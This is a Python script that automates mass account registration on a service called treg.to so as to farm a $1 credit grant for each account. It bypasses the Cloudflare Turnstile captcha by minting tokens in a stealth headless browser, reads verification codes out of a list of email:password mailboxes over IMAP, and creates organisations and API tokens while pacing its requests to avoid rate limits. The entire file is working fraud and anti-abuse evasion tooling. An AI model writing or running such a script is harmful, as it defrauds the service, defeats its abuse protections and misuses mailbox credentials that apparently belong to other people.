# treg.to pool autoreg v3 — Turnstile bypass via cloakbrowser native token factory
# t-online pool (email:pass) -> $1 grant per distinct mailbox.
# Usage: python treg_farm_v3.py <pool_file> <count> [--start N] [--pace 40]
import sys, json, time, re, random, os, imaplib, email.utils, argparse
import requests
from datetime import datetime, timezone

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "treg_pool_accounts.jsonl")
STATE = os.path.join(HERE, "treg_pool_state.json")
BASE = "https://treg.to"
HDRS = {"Content-Type": "application/json", "X-Treg-Key-Protocol": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Origin": "https://treg.to", "Referer": "https://treg.to/app"}
SITEKEY = "0x4AAAAAAFVJ1qUhtZ_qG-N7"

IMAP_HOSTS = {
    "t-online.de": "secureimap.t-online.de",
    "gmail.com": "imap.gmail.com",
    "web.de": "imap.web.de",
    "gmx.de": "imap.gmx.net",
    "outlook.com": "outlook.office365.com",
    "hotmail.com": "outlook.office365.com",
}

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}", flush=True)

def imap_host(addr):
    return IMAP_HOSTS.get(addr.split("@", 1)[1].lower(), "imap." + addr.split("@", 1)[1].lower())

# ---------------------------------------------------------------- token factory
class TokenFactory:
    """cloakbrowser page on treg.to/app with Sign-in form open; native
    window.tregCaptcha.token('email_start') mints fresh single-use tokens (~0s)."""
    def __init__(self, proxy=None):
        self.proxy = proxy or None
        self.b = None
        self.pg = None
        self.minted = 0

    def launch(self):
        import cloakbrowser
        self.close()
        self.b = cloakbrowser.launch(headless=True, proxy=self.proxy)
        try:
            self.pg = self.b.new_page()
        except Exception:
            self.pg = self.b.new_context().new_page()
        self.pg.goto(BASE + "/app", wait_until="domcontentloaded", timeout=90000)
        time.sleep(3)
        try:
            self.pg.click("//nav//a[normalize-space()='Sign in']", timeout=15000)
        except Exception:
            self.pg.click("text=Sign in", timeout=15000)
        time.sleep(1.5)
        self.pg.fill("#em-input", "factory@example.com")  # focus arms the widget
        time.sleep(2)
        log("token factory UP")

    def close(self):
        try:
            if self.b: self.b.close()
        except Exception:
            pass
        self.b = self.pg = None

    def token(self, retries=3):
        for att in range(retries):
            try:
                if self.pg is None:
                    self.launch()
                tok = self.pg.evaluate("()=>window.tregCaptcha?window.tregCaptcha.token('email_start'):'no-captcha-obj'")
                if tok and len(tok) > 50 and not tok.startswith("!") and tok != "no-captcha-obj":
                    self.minted += 1
                    return tok
                log(f"token bad ({str(tok)[:20]}) — reload page")
                self.pg.reload(wait_until="domcontentloaded", timeout=90000)
                time.sleep(3)
                try:
                    self.pg.click("//nav//a[normalize-space()='Sign in']", timeout=15000)
                except Exception:
                    pass
                time.sleep(1)
                self.pg.fill("#em-input", "factory@example.com")
                time.sleep(2)
            except Exception as e:
                log(f"factory err ({str(e)[:80]}) — relaunch")
                try: self.launch()
                except Exception as e2:
                    log(f"relaunch fail: {str(e2)[:100]}")
                    time.sleep(20)
        return None

# ---------------------------------------------------------------- reg flow
def req_with_retry(sess, method, path, retries=6, **kw):
    url = BASE + path
    for att in range(retries):
        try:
            r = sess.request(method, url, timeout=40, **kw)
            if r.status_code == 503 and "saturated" in r.text:
                time.sleep(8 + att * 7 + random.uniform(0, 5))
                continue
            try:
                return r.status_code, r.json()
            except Exception:
                return r.status_code, {"raw": r.text[:200]}
        except Exception as e:
            if att == retries - 1:
                return 0, {"err": str(e)[:150]}
            time.sleep(5 + att * 4)
    return 503, {"err": "saturated-exhausted"}

def imap_code(host, user, passwd, want_email, since_ts, timeout_s=150):
    deadline = time.time() + timeout_s
    m = None
    while time.time() < deadline:
        try:
            if m is None:
                m = imaplib.IMAP4_SSL(host)
                m.login(user, passwd)
                m.select("INBOX", readonly=True)
            m.noop()
            typ, data = m.search(None, "FROM", "treg.to")
            ids = data[0].split()
            for i in reversed(ids[-6:]):
                typ, msg = m.fetch(i, "(BODY.PEEK[HEADER.FIELDS (TO SUBJECT DATE)])")
                hdr = msg[0][1].decode("utf-8", "ignore")
                if want_email.lower() not in hdr.lower():
                    continue
                dm = re.search(r"Date: (.+)", hdr)
                if dm:
                    try:
                        dts = email.utils.parsedate_to_datetime(dm.group(1).strip()).timestamp()
                        if dts < since_ts - 30:
                            continue
                    except Exception:
                        pass
                subj = re.search(r"Subject: .*?(\d{6})", hdr)
                if subj:
                    code = subj.group(1)
                    try: m.logout()
                    except Exception: pass
                    return code
                typ, msg = m.fetch(i, "(BODY.PEEK[TEXT]<0.4096>)")
                body = msg[0][1].decode("utf-8", "ignore")
                bm = re.search(r"(?:code|Code|CODE)[^\d]{0,40}(\d{6})", body) or re.search(r">\s*(\d{6})\s*<", body)
                if bm:
                    try: m.logout()
                    except Exception: pass
                    return bm.group(1)
        except Exception as e:
            log(f"imap err ({host}): {str(e)[:80]}")
            try:
                if m: m.logout()
            except Exception: pass
            return None
        time.sleep(5)
    try:
        if m: m.logout()
    except Exception: pass
    return None

ORG_WORDS = ["reformlab", "vladwork", "gothlab", "stackyard", "promptden", "datahive",
             "keynest", "loopdock", "nodegarden", "byteshed", "orbitkit", "fluxden",
             "craftloop", "mintyard", "quoravan", "signalpod", "driftpost", "emberkit"]

def reg_one(tf, email_addr, passwd, used_orgs):
    sess = requests.Session()
    sess.headers.update(HDRS)
    rec = {"email": email_addr, "ts": datetime.now(timezone.utc).isoformat()}
    since_ts = time.time()
    tok = tf.token()
    if not tok:
        rec["stage"], rec["err"] = "token", "factory dead"
        return rec
    st, d = req_with_retry(sess, "POST", "/auth/email/start",
                           json={"email": email_addr, "captcha_token": tok})
    if st == 400 and "captcha" in json.dumps(d).lower():
        # single-use collision — force fresh widget and retry once
        log("captcha_failed — reminting")
        try:
            tf.pg.evaluate("()=>{window.tregCaptcha&&window.tregCaptcha.reset&&window.tregCaptcha.reset()}")
        except Exception:
            pass
        time.sleep(3)
        tok = tf.token()
        if tok:
            st, d = req_with_retry(sess, "POST", "/auth/email/start",
                                   json={"email": email_addr, "captcha_token": tok})
    if st != 200:
        rec["stage"], rec["err"] = "start", f"{st} {json.dumps(d)[:150]}"
        return rec
    code = imap_code(imap_host(email_addr), email_addr, passwd, email_addr, since_ts)
    if not code:
        rec["stage"], rec["err"] = "imap", "no code"
        return rec
    st, d = req_with_retry(sess, "POST", "/auth/email/verify", json={"email": email_addr, "code": code})
    if st != 200 or "token" not in d:
        rec["stage"], rec["err"] = "verify", f"{st} {json.dumps(d)[:150]}"
        return rec
    rec["token"] = d["token"]
    org_name = None
    for w in random.sample(ORG_WORDS, len(ORG_WORDS)):
        cand = f"{w}{random.randint(10000, 99999)}"
        if cand not in used_orgs:
            org_name = cand
            break
    st, d = req_with_retry(sess, "POST", "/orgs", json={"name": org_name},
                           headers={"X-Treg-Token": rec["token"]})
    if st >= 400:
        rec["stage"], rec["err"] = "org", f"{st} {json.dumps(d)[:150]}"
        return rec
    used_orgs.add(org_name)
    rec["org"] = org_name
    time.sleep(1.5)
    slug = org_name
    st, d = req_with_retry(sess, "GET", "/orgs", headers={"X-Treg-Token": rec["token"]})
    if st == 200:
        orgs = d if isinstance(d, list) else d.get("orgs", d.get("items", []))
        for o in orgs:
            if isinstance(o, dict) and (o.get("name") == org_name or str(o.get("slug", "")).startswith(org_name)):
                slug = o.get("slug") or org_name
                rec["org_id"] = o.get("org_id") or o.get("id")
                break
    st, d = req_with_retry(sess, "GET", "/auth/cli-token", headers={"X-Treg-Org": slug})
    if st == 200 and d.get("token"):
        rec["org_token"] = d["token"]
    else:
        rec["stage"], rec["err"] = "pin", f"{st} {json.dumps(d)[:150]}"
        return rec
    rec["org"] = slug
    sess.headers["X-Treg-Token"] = rec["org_token"]
    st, d = req_with_retry(sess, "GET", "/orgs")
    if st == 200:
        orgs = d if isinstance(d, list) else d.get("orgs", d.get("items", []))
        for o in orgs:
            if isinstance(o, dict) and o.get("slug") == slug:
                rec["org_id"] = o.get("org_id") or o.get("id")
    time.sleep(2.0)
    if rec.get("org_id"):
        st, d = req_with_retry(sess, "GET", f"/orgs/{rec['org_id']}/balance?limit=3")
        if st == 200:
            rec["balance_micro"] = d.get("balance_micro", d.get("balance"))
        else:
            rec["bal_err"] = f"{st} {json.dumps(d)[:100]}"
    return rec

def load_pool(path, skip):
    rows = []
    for l in open(path, encoding="utf-8", errors="ignore"):
        l = l.strip()
        if not l or l.startswith("#") or ":" not in l:
            continue
        e, p = l.split(":", 1)
        rows.append((e.strip(), p.strip()))
    return rows[skip:]

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("pool")
    ap.add_argument("count", type=int)
    ap.add_argument("--start", type=int, default=0)
    ap.add_argument("--pace", type=int, default=40)
    args = ap.parse_args()
    st = {"used": [], "failed": []}
    if os.path.exists(STATE):
        with open(STATE, encoding="utf-8") as f:
            st = json.load(f)
    used_emails = set(st["used"])
    pool = [r for r in load_pool(args.pool, args.start) if r[0] not in used_emails]
    used_orgs = set()
    if os.path.exists(OUT):
        for l in open(OUT, encoding="utf-8"):
            try:
                r = json.loads(l)
                if r.get("org"): used_orgs.add(r["org"])
            except Exception: pass
    tf = TokenFactory()
    tf.launch()
    ok, fail, nogrant = 0, 0, 0
    try:
        for email_addr, passwd in pool[:args.count]:
            rec = reg_one(tf, email_addr, passwd, used_orgs)
            st["used"].append(email_addr)
            if rec.get("org_token"):
                bal = int(rec.get("balance_micro") or 0)
                if bal < 1000000: nogrant += 1
                with open(OUT, "a", encoding="utf-8") as f:
                    f.write(json.dumps(rec) + "\n")
                ok += 1
                log(f"OK {email_addr} org={rec['org']} bal=${bal/1e6:.2f} (ok={ok} minted={tf.minted})")
            else:
                st["failed"].append({k: rec.get(k) for k in ("email", "stage", "err", "ts")})
                fail += 1
                log(f"FAIL {email_addr} stage={rec.get('stage')} err={str(rec.get('err',''))[:110]}")
                if rec.get("stage") == "start" and "429" in str(rec.get("err", "")):
                    log("RATE-LIMITED — cooling 900s")
                    time.sleep(900)
            with open(STATE, "w", encoding="utf-8") as f:
                json.dump(st, f)
            time.sleep(args.pace + random.uniform(0, 15))
    finally:
        tf.close()
    log(f"V3 WAVE DONE ok={ok} nogrant={nogrant} fail={fail} minted={tf.minted}")

if __name__ == "__main__":
    main()
